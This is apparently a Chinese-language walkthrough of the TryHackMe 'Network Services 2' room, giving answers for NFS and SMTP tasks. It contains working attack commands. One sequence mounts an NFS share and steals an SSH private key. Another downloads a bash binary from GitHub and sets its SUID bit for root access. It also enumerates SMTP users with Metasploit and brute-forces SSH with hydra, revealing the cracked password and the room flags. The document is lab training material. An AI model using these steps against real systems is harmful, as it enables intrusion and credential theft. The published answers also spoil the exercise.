# Newwork Services 2

**🌐 網路服務 2**

THM路徑：https://tryhackme.com/room/networkservices2

---

>> #### Task 1：建立聯繫

>> #### Task 2：瞭解 NFS

**NFS（Network File System）**：
- 一種可以**跨網路共享檔案或資料夾**的協定
- 你可以把遠端資料夾 **掛載（mount）在自己電腦上使用**，像自己硬碟一樣
- 主用 **RPC（Remote Procedure Call）** 進行資料操作


- 哪些系統支援 NFS：
  - Linux 🐧
  - macOS 🍎
  - UNIX ☀️
  - Windows Server（透過 NFS 服務）🪟


<details>
<summary><strong>運作方式：</strong></summary>

1. 用戶端（Client）發出 mount 請求
2. 伺服器判斷用戶是否有權限
3. 如果有權限 → 回傳「file handle」讓 client 能使用那個資料夾
4. Client 就可以像在本地一樣瀏覽與編輯那些檔案（依權限）
---

當使用者透過 NFS（Network File System）要存取檔案時，會由客戶端對伺服器上的 NFSD（NFS 守護程序） 發出一個 RPC 呼叫（遠端程序呼叫）。這個呼叫會夾帶以下參數：

| 參數              | 說明                                             |
|-------------------|--------------------------------------------------|
| File Handle       | 用來識別檔案的唯一代碼（非路徑）                 |
| File Name         | 要存取的檔案名稱                                 |
| User ID (UID)     | 請求存取檔案的使用者 ID（數字）                   |
| Group ID (GID)    | 該使用者所屬的群組 ID（數字）                     |

</details>

---
<details>
<summary><strong>NFS 的安全性問題</strong></summary>

| 漏洞點類型         | 說明 |
|:------------------|:----|
| 匿名掛載          | 某些 NFS 分享沒有做權限限制，任何人都能掛載 |
| root_squash 關閉  | 客戶端掛載後就能以 root 權限操作檔案，爆炸危險 💣 |
| 傳統明文協定      | 沒有加密，可能被攔截封包或篡改 |
| 可寫入敏感資料     | 可種 backdoor / 上傳 SSH key 等 |

</details>

##### 🔐 答題：
1. What does NFS stand for?
   
   NFS 代表什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Network File System`

2. What process allows an NFS client to interact with a remote directory as though it was a physical device?
   
   什麼進程允許 NFS 用戶端與遠端目錄交互，就像它是物理設備一樣？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Mounting`

3. What does NFS use to represent files and directories on the server?
   
   NFS 使用什麼來表示伺服器上的文件和目錄？
   
&nbsp;&nbsp;&nbsp;&nbsp; `file handle`

4. What protocol does NFS use to communicate between the server and client?
   
   NFS 使用什麼協定在伺服器和客戶端之間進行通信？
   
&nbsp;&nbsp;&nbsp;&nbsp; `RPC`

5. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
   
   NFS 伺服器將哪兩條用戶數據作為控制使用者許可權的參數？格式：參數 1 / 參數 2
   
&nbsp;&nbsp;&nbsp;&nbsp; `user id / group id`

6. Can a Windows NFS server share files with a Linux client? (Y/N)
   
   Windows NFS 伺服器是否可以與 Linux 用戶端共享檔？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

7. Can a Linux NFS server share files with a MacOS client? (Y/N)
   
   Linux NFS 伺服器可以與 MacOS 用戶端共享檔嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

8. What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
   
   NFS 的最新版本是什麼？[2016 年發布，但截至 2020 年仍是最新的]這將需要外部研究。
   
&nbsp;&nbsp;&nbsp;&nbsp; `4.2`

>> #### Task 3：枚舉 NFS

🛠️ 工具需求：`nfs-common`
- 對象：需要掛載 NFS 的客戶端／伺服器。
- 包含指令：`showmount`、`mount.nfs`（本次重點）。

---

📂 掛載 NFS Share
1. 建立本地目錄作為掛載點，例如： 
`mkdir /tmp/mount/`
2. 掛載指令格式：`sudo mount -t nfs [IP]:[share名] /tmp/mount/ -nolock`

<details>
<summary><strong>參數說明：</strong></summary>

| 參數       | 說明                            |
|------------|---------------------------------|
| `sudo`     | 以 root 權限執行                |
| `mount`    | 掛載指令                        |
| `-t nfs`   | 指定掛載類型為 NFS              |
| `IP:share` | NFS 伺服器的 IP 和分享目錄名稱 |
| `-nolock`  | 不使用 NLM 鎖定（避免錯誤）     |

</details>

Question 1、2：對靶機執行`nmap`掃描

- 找到 7 個 Port
- nfs 服務對應端口為 2049

<p align="left">
  <img src="/rooms/images/12_01.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_02.png" width="600">
</p>

Question 3：用`showmount`，列出靶機的NFS共享

- NFS共享名稱為：/home

<p align="left">
  <img src="/rooms/images/12_03.png" width="600">
</p>

Question 4 - 7：於虛擬機上創建一個掛載點，使用`mount`掛載遠程主機的 NFS，再查看 NFS 共享內容

- NFS共享中的文件夾名稱為：cappucino 
- 保存SSH密鑰文件的文件夾是：.ssh文件夾
- 最有用的SSH密鑰文件是：id_rsa （ssh私鑰文件）

```
mkdir /tmp/mount
mount -t nfs <IP>:home /tmp/mount/ -nolock
cd /tmp/mount
ls
cd cappucino
ls -a
cd .ssh
ls
```

<p align="left">
  <img src="/rooms/images/12_04.png" width="600">
</p>

Question 8：複製公鑰、私鑰到虛擬機上，讀取公鑰檔案，並變更私鑰權限。<br>
以 ssh 私鑰登入 nfs 服務

```
cp id_rsa* ~/.ssh
cd ~/.ssh
ls -a
cat id_rsa.pub
chmod 600 id_rsa
ssh -i id_rsa cappucino@<IP>
```
<p align="left">
  <img src="/rooms/images/12_05.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_06.png" width="600">
</p>

##### 🔐 答題：
1. How many ports are open on the target machine?
   
   目標計算機上打開了多少個埠？
   
&nbsp;&nbsp;&nbsp;&nbsp; `7`

2. Which port contains the service we're looking to enumerate?
   
   哪個埠包含我們要列舉的服務？
   
&nbsp;&nbsp;&nbsp;&nbsp; `2049`

3. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
   
   現在，使用 /usr/sbin/showmount -e [IP] 列出 NFS 共用，可見共用的名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `/home`

4. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
   
   然後，使用我們之前分解的 mount 命令將 NFS 共用掛載到您的本地電腦。將目錄更改為掛載共用的位置 - 其中的資料夾名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `cappucino`

6. Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
   
   有趣！現在讓我們做一些研究，看看這些資料夾。這些摺疊者中的哪些可以控制密鑰 ，使我們能夠遠端訪問伺服器？
   
&nbsp;&nbsp;&nbsp;&nbsp; `.ssh`

7. Which of these keys is most useful to us?
   
   這些鑰中哪一個對我們最有用？
   
&nbsp;&nbsp;&nbsp;&nbsp; `id_rsa`

8. Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
   
   我們可以使用 ssh -i <key-file> <username>@<ip> 登錄計算機嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

>> #### Task 4：利用 NFS

**NFS 提權**

- Root Squash 是什麼？
    - Root Squash：NFS 預設開啟，防止遠端使用者以 root 權限操作。
    - 被套用 Root Squash 時，遠端 root 使用者會被降為 nfsnobody 低權限帳號。<br>

✅ **如果 Root Squash 關閉** ➔ 可以利用上傳檔案設置 SUID 位元進行提權！

---

- SUID 是什麼？
  - SUID (Set User ID)：讓執行檔以檔案擁有者的**權限執行**。
  - 如果 SUID 設在 root 擁有的檔案上，普通用戶執行時可直接取得 root 權限。

---

- 📌      攻擊流程（提權步驟）
1. 取得 低權限 shell。
2. 上傳自己的 bash 可執行檔到 NFS 分享目錄。
3. 設定該 bash 檔案的 SUID 權限。
4. 通過 SSH 登入目標機器。
5. 執行剛剛上傳的 SUID bash ➔ 取得 root 權限！

✅ Bash 可執行檔來源
- 指令範例（用 SCP 抓 bash）：<br>
`scp -i [私鑰檔] [使用者名稱]@[目標IP]:/bin/bash ~/Downloads/bash`
- 或從網路下載相容版本的 Ubuntu bash（需注意不要下載錯誤版本）。

---

Question 3：從 Github 下載 bash 到虛擬機（如為免費AttackBox，無法下載）
`wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`

<p align="left">
  <img src="/rooms/images/12_07.png" width="600">
</p>

```
ls -a
chown root bash
chmod +x bash
cp bash /tmp/mount/cappucino/
chmod +s /tmp/mount/cappucino/bash
ssh -i id_rsa cappucino@10.10.20.187
```

下載完成後：

- `ls -a` <br>列出目前目錄所有檔案（確認 bash 是否存在）


- `chown root bash` <br>將 bash 的擁有者改為 root（讓 SUID 能以 root 身份執行）


- `chmod +x bash` <br>賦予執行權限


- `cp bash /tmp/mount/cappucino/`<br>將 bash 複製到 NFS 掛載目錄（目標機可存取）


- `chmod +s /tmp/mount/cappucino/bash` <br>開啟 SUID bit，讓任何人執行時以 root 身份執行


- `ssh -i id_rsa cappucino@<IP>` <br>以 SSH 登入目標機器（低權限帳號）

<p align="left">
  <img src="/rooms/images/12_08.png" width="600">
</p>

```
ls -la
./bash -p
```

- `ls -la`<br>	顯示所有檔案（含隱藏檔）+ 詳細資料

Question 4：該 bash 權限為 `-rwsr-sr-x`

- `rws` ： **擁有者（user）** 有 讀、寫、執行 權限，但 s 代表 啟用 SUID（Set User ID）
- `r-s` ： **群組**  有 讀、執行 權限，且 s 代表 啟用 SGID（Set Group ID）
- `r-x` ： **其他人** 有 讀、執行 權限

<p align="left">
  <img src="/rooms/images/12_09.png" width="600">
</p>

Question 5：進入 bash shell 後讀取 root.txt，

- `/bash -p` 是一個常見的 權限提升技巧，它的用途在於：
<br>✅ 以保留原本權限（尤其是 root 權限）方式開啟 bash shell，獲得 Flag 🎉🎉

<p align="left">
  <img src="/rooms/images/12_10.png" width="600">
</p>

##### 🔐 答題：
2. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
   
   現在，我們將使用 「sudo chmod +[permission] bash」 將 SUID 位許可權添加到剛剛複製到共用的 bash 可執行檔中。我們使用什麼字母來設置使用 chmod 設置的 SUID 位？
   
&nbsp;&nbsp;&nbsp;&nbsp; `s`

3. Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
   
   讓我們做一個健全性檢查，讓我們使用 「ls -la bash」 檢查 「bash」 可執行文件的許可權。許可權集是什麼樣的？確保它以 -sr-x 結尾。
   
&nbsp;&nbsp;&nbsp;&nbsp; `-rwsr-sr-x`

5. Great! If all's gone well you should have a shell as root! What's the root flag?
   
   偉大！如果一切順利，你應該有一個 shell 作為 root！什麼是旗子？
   
&nbsp;&nbsp;&nbsp;&nbsp; `THM{nfs_got_pwned}`

>> #### Task 5：瞭解 SMTP

- **SMTP** 是什麼？
    - 全名：**Simple Mail Transfer Protocol**
    - 功能：**負責寄出電子郵件**
    - 配對協議：需與 **POP 或 IMAP** 搭配，用於收信


- **SMTP** 的基本功能
    - 驗證寄件者身份
    - 負責**寄出郵件**
    - 若寄送失敗，會**退信給寄件人**
  

- SMTP 常用 Port
    - 預設使用 **25 號 Port**
    - 加密版本可能使用 465 或 587


- SMTP 運行環境
  - **Windows / Linux** 都能安裝 SMTP Server
  - 常見伺服器軟體如：Postfix、Sendmail、Exim
  

<details>
<summary><strong>🔹 SMTP 工作流程（簡化版）</strong></summary>

1. 郵件客戶端（如 Outlook）連線到 SMTP 伺服器（如 smtp.google.com）
2. 發送者填入寄件人、收件人、信件內容
3. 檢查寄件者與收件者是否同網域
4. 發件伺服器連線到收件伺服器，若失敗則加入「SMTP 排隊」
5. 收件伺服器驗證信件 → 傳給 POP / IMAP 伺服器
6. 使用者就能在收件匣看到信件了！

<p align="left">
  <img src="/rooms/images/12_11.png" width="600">
</p>

</details>

---

📥 POP vs IMAP（收信協議比較）：

| 協議 | 特性說明 |
|------|----------|
| POP  | 下載郵件到本機，不同步其他裝置 |
| IMAP | 與伺服器同步，多裝置可見一致信件內容 ✅ |

##### 🔐 答題：
1. What does SMTP stand for?
   
   SMTP 代表什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Simple Mail Transfer Protocol`

2. What does SMTP handle the sending of? (answer in plural)
   
   SMTP 處理什麼發送？（答案為複數）
   
&nbsp;&nbsp;&nbsp;&nbsp; `emails`

3. What is the first step in the SMTP process?
   
   SMTP 流程的第一步是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `SMTP handshake`

4. What is the default SMTP port?
   
   什麼是預設 SMTP 連接埠？
   
&nbsp;&nbsp;&nbsp;&nbsp; `25    `

5. Where does the SMTP server send the email if the recipient's server is not available?
   
   如果收件者的伺服器不可用，SMTP 伺服器會將電子郵件發送到何處？
   
&nbsp;&nbsp;&nbsp;&nbsp; `smtp queue`

6. On what server does the Email ultimately end up on?
   
   電子郵件最終會在哪個伺服器上結束？
   
&nbsp;&nbsp;&nbsp;&nbsp; `POP/IMAP`

7. Can a Linux machine run an SMTP server? (Y/N)
   
   Linux 機器可以運行 SMTP 伺服器嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

8. Can a Windows machine run an SMTP server? (Y/N)
    
   Windows 機器可以運行 SMTP 伺服器嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

>> #### Task 6：枚舉 SMTP

🔍 **枚舉 Mail Server 資訊**
- 工具： Metasploit 模組 `smtp_version`
  <br> → 掃描 IP 區段並判斷是否為 SMTP 服務與其版本。
    
👤 **SMTP 用戶枚舉**
- 工具： Metasploit 模組 `smtp_enum`<br>
→ 指定目標主機與使用者清單，即可自動執行枚舉。
  - `VRFY`： 確認使用者名稱是否存在
  - `EXPN`： 顯示別名或郵件清單的實際地址

Question 1：掃描靶機後，發現 smtp 對應的端口為 25，並且可以允許 `VRFY` 命令
<p align="left">
  <img src="/rooms/images/12_12.png" width="600">
</p>

Question 2 - 6：啟動 Metasploit 主控台<br>
搜尋 smtp 版本檢測模組 --> 選擇該模組並列出模組相關的參數選項 --> 完成參數設置並最終執行該模組。

```
msfconsole
search smtp_version   # 搜尋 smtp_version 模組
use 0                 # 使用搜尋結果中的第 0 個模組       
options               # 查看此模組可設置參數
set RHOSTS <IP>       # 設定目標 IP（可換成你的目標主機）    
run                   # 執行模組，開始偵測
```

- 要使用的完整模組名稱是：auxiliary/scanner/smtp/smtp_version
- 目標機器使用的系統郵件名稱是： polosmtp.home
- 目標機器使用的郵件傳輸代理是： Postfix


<p align="left">
  <img src="/rooms/images/12_13.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_14.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_15.png" width="600">
</p>

Question 7：關於郵件傳輸代理（MTA）

<p align="left">
  <img src="/rooms/images/12_16.png" width="600">
</p>

Question 8 - 12：啟動 Metasploit 主控台<br>

```
msfconsole                      # 啟動 Metasploit 主控台
search smtp_enum                # 搜尋可用的 SMTP 使用者列舉模組          
use 0                           # 使用搜尋結果中的第 0 個模組
options
set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt  
#基於虛擬機上的SecLists實際安裝路徑 # 設定使用者帳號字典檔，這個字典檔會用來測試每個帳號是否存在
set RHOSTS <IP> #此處IP為靶機IP  # 設定靶機 IP，會對這個目標進行 VRFY 或 EXPN 指令來列舉使用者帳號
run                             # 執行模組，開始進行 SMTP 使用者列舉
```

<p align="left">
  <img src="/rooms/images/12_17.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_18.png" width="600">
</p>

- 要使用的完整模組名稱是：auxiliary/scanner/smtp/smtp_enum
- 找到一個使用者，使用者名稱為：administrator


##### 🔐 答題：
1. First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
   
   首先，讓我們對目標計算機運行埠掃描，與上次相同。SMTP 在哪個埠上運行？
   
&nbsp;&nbsp;&nbsp;&nbsp; `25`

2. Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
   
   好了，現在我們知道應該針對哪個埠了，讓我們啟動 Metasploit。我們使用什麼命令來執行此作？
   
&nbsp;&nbsp;&nbsp;&nbsp; `msfconsole`

3. Let's search for the module "smtp_version", what's it's full module name?
   
   讓我們搜索模組 「smtp_version」，它的完整模組名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `auxiliary/scanner/smtp/smtp_version`

4. Great, now- select the module and list the options. How do we do this?
   
   太好了，現在 - 選擇模組並列出選項。我們是如何做到的？
   
&nbsp;&nbsp;&nbsp;&nbsp; `options`

5. Have a look through the options, does everything seem correct? What is the option we need to set?
   
   看看這些選項，一切似乎都正確嗎？我們需要設置什麼選項？
   
&nbsp;&nbsp;&nbsp;&nbsp; `RHOSTS`

6. Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
   
   將其設置為目標計算機的正確值。然後運行漏洞利用。系統郵件名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `polosmtp.home`

7. What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
   
   哪個郵件傳輸代理 （MTA） 正在運行 SMTP 伺服器？這將需要一些外部研究。
   
&nbsp;&nbsp;&nbsp;&nbsp; `Postfix`

8. Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
   
   好！現在，我們已經獲得了有關目標系統的大量資訊，可以進入下一階段。讓我們搜尋模組 「smtp_enum」 它完整模組名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `auxiliary/scanner/smtp/smtp_enum`

9. What option do we need to set to the wordlist's path?
   
   我們需要為 wordlist 的 path 設置什麼選項？
   
&nbsp;&nbsp;&nbsp;&nbsp; `USER_FILE`

10. Once we've set this option, what is the other essential paramater we need to set?
   
    一旦我們設置了這個選項，我們需要設置的另一個基本參數是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `RHOSTS`

12. Okay! Now that's finished, what username is returned?
   
    好！現在完成後，返回的使用者名是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `administrator`

>> #### Task 7：利用 SMTP

由前兩個章節，進行 `hydra` 密碼破解，都入 ssh 服務

Question 1：輸入 `hydra -t 16 -l 使用者帳號 -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh`

<details>
<summary>參數說明</summary>

| 參數 | 說明 |
|:----|:----|
| `-l <帳號>` | 指定一個帳號（單一帳號測試） |
| `-L <檔案>` | 指定帳號清單檔案（多個帳號爆破） |
| `-p <密碼>` | 指定一個密碼（單一密碼測試） |
| `-P <檔案>` | 指定密碼清單檔案（多個密碼爆破） |
| `-C <檔案>` | 指定帳號:密碼格式的清單檔案（login:pass 格式） |
| `-t 4` | 每個目標開幾個連線並行（預設 16，可調整） |
| `-s <port>` | 指定非預設 port（例如 FTP 改其他 port） |
| `-e nsr` | 嘗試 null 密碼 (n)、帳號=密碼 (s)、反轉 (r) |
| `-vV` | 超詳細輸出，每一組帳密都顯示 |
| `-f` | 找到就停止（單一目標） |
| `-F` | 找到就停止（多目標） |
| `-o <檔案>` | 將成功結果寫入檔案 |

</details>

<p align="left">
  <img src="/rooms/images/12_19.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_20.png" width="600">
</p>

- administrator 使用者的 ssh 登錄密碼為：alejandro

Question 2：登入 ssh 列出檔案，讀取 stmp.txt，獲得 Flag 🎉🎉

<p align="left">
  <img src="/rooms/images/12_21.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_22.png" width="600">
</p>

##### 🔐 答題：
1. What is the password of the user we found during our enumeration stage?
   
   我們在枚舉階段找到的用戶的密碼是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `alejandro`

2. Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
   
   偉大！現在，讓我們以使用者身份 SSH 進入伺服器，smtp.txt 的內容是什麼
   
&nbsp;&nbsp;&nbsp;&nbsp; `THM{who_knew_email_servers_were_c00l?}`

>> #### Task 8：瞭解 MySQL

>> #### Task 9：利用 MySQL 

>> #### Task 10：結論
